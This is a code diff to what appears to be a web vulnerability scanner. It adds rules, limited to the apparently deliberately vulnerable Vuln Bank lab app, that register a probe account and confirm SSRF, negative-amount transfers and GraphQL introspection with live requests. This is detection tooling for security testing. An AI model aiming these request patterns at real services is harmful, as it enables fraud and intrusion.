@@ -16574,6 +16574,52 @@ const vulnbankSqliAdminToken = async (ctx: RuleContext): Promise<string | null> 
   return null;
 };
 
+const VULNBANK_PROBE_PASSWORD = "ThugirProbe1!";
+
+async function vulnbankProbeUserToken(
+  ctx: RuleContext,
+  opts: { balance?: number } = {}
+): Promise<string | null> {
+  const username = `thugir_probe_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const registerUrl = new URL("/register", ctx.origin).toString();
+  const registerBody: Record<string, unknown> = {
+    username,
+    password: VULNBANK_PROBE_PASSWORD
+  };
+  if (opts.balance !== undefined) registerBody.balance = opts.balance;
+  const registerDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify(registerBody),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 300) return null;
+  try {
+    const parsed = JSON.parse(registerDoc.body) as Record<string, unknown>;
+    if (parsed.status !== "success") return null;
+  } catch {
+    return null;
+  }
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password: VULNBANK_PROBE_PASSWORD }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return null;
+  try {
+    const parsed = JSON.parse(loginDoc.body) as Record<string, unknown>;
+    const token = String(parsed.token ?? "");
+    if (parsed.status === "success" && token.startsWith("eyJ")) return token;
+  } catch {
+    return null;
+  }
+  return null;
+}
+
 const vulnbankMerchantRegisterLiveOracle: Rule = async (ctx) => {
   if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
   const registerUrl = new URL("/api/v1/merchants/register", ctx.origin).toString();
@@ -16826,6 +16872,141 @@ const vulnbankVirtualCardsBolaLiveOracle: Rule = async (ctx) => {
       freezeUrl,
       snippet: freezeDoc.body.slice(0, 280).trim(),
       note: "Vuln Bank user B can POST /api/virtual-cards/{cardId}/toggle-freeze on user A's virtual card without ownership check — BOLA virtual-cards oracle"
+    }
+  };
+};
+
+const vulnbankUploadProfilePictureUrlSsrfLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const token = await vulnbankProbeUserToken(ctx);
+  if (!token) return NEGATIVE;
+  const uploadUrl = new URL("/upload_profile_picture_url", ctx.origin).toString();
+  const imageUrl = "https://www.google.com/favicon.ico";
+  const payload = JSON.stringify({ image_url: imageUrl });
+  const doc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body: payload,
+    headers: {
+      "Content-Type": "application/json",
+      Authorization: `Bearer ${token}`
+    },
+    maxBytes: 4096,
+    timeoutMs: 20000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const status = String(parsed.status ?? "");
+  const message = String(parsed.message ?? "");
+  const debugInfo = parsed.debug_info;
+  if (status !== "success" || !/imported from URL/i.test(message)) return NEGATIVE;
+  if (!debugInfo || typeof debugInfo !== "object") return NEGATIVE;
+  const fetchedUrl = String((debugInfo as { fetched_url?: unknown }).fetched_url ?? "");
+  const httpStatus = (debugInfo as { http_status?: unknown }).http_status;
+  if (fetchedUrl !== imageUrl || httpStatus !== 200) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: uploadUrl,
+      fetchedUrl,
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "Vuln Bank POST /upload_profile_picture_url fetches attacker-controlled image_url server-side and saves the response — profile-picture URL SSRF oracle"
+    }
+  };
+};
+
+const vulnbankTransferNegativeAmountLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const startingBalance = 1000;
+  const transferAmount = -500;
+  const token = await vulnbankProbeUserToken(ctx, { balance: startingBalance });
+  if (!token) return NEGATIVE;
+  const transferUrl = new URL("/transfer", ctx.origin).toString();
+  const payload = JSON.stringify({
+    to_account: "1234567890",
+    amount: transferAmount,
+    description: "thugir negative transfer probe"
+  });
+  const doc = await ctx.probe.get(transferUrl, {
+    method: "POST",
+    body: payload,
+    headers: {
+      "Content-Type": "application/json",
+      Authorization: `Bearer ${token}`
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const status = String(parsed.status ?? "");
+  const newBalance = (parsed as { new_balance?: unknown }).new_balance;
+  if (status !== "success" || typeof newBalance !== "number") return NEGATIVE;
+  if (newBalance <= startingBalance) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: transferUrl,
+      startingBalance,
+      transferAmount,
+      newBalance,
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "Vuln Bank POST /transfer accepts negative amount and credits the sender's balance — money-transfer business-logic oracle"
+    }
+  };
+};
+
+const vulnbankGraphqlIntrospectionLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const token = await vulnbankProbeUserToken(ctx);
+  if (!token) return NEGATIVE;
+  const graphqlUrl = new URL("/graphql", ctx.origin).toString();
+  const payload = JSON.stringify({
+    query: "{ __schema { queryType { name } types { name } } }"
+  });
+  const doc = await ctx.probe.get(graphqlUrl, {
+    method: "POST",
+    body: payload,
+    headers: {
+      "Content-Type": "application/json",
+      Authorization: `Bearer ${token}`
+    },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const data = parsed.data;
+  if (!data || typeof data !== "object") return NEGATIVE;
+  const schema = (data as { __schema?: unknown }).__schema;
+  if (!schema || typeof schema !== "object") return NEGATIVE;
+  const queryType = String((schema as { queryType?: { name?: unknown } }).queryType?.name ?? "");
+  const types = (schema as { types?: unknown[] }).types;
+  if (queryType !== "Query" || !Array.isArray(types) || types.length < 3) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: graphqlUrl,
+      typeCount: types.length,
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "Vuln Bank POST /graphql returns __schema introspection for authenticated users — GraphQL introspection oracle"
     }
   };
 };
@@ -35094,6 +35275,9 @@ export const RULES: Record<string, Rule> = {
   vulnbankBillPaymentsNegativeAmountLiveOracle,
   vulnbankMerchantPaymentChargeLiveOracle,
   vulnbankVirtualCardsBolaLiveOracle,
+  vulnbankUploadProfilePictureUrlSsrfLiveOracle,
+  vulnbankTransferNegativeAmountLiveOracle,
+  vulnbankGraphqlIntrospectionLiveOracle,
   brokencrystalsMarketplacePrototypePollutionLiveOracle,
   clientSideDragSecurityFlawsEvidence,
   clientSideDragSecurityFlawsLabModuleEvidence,
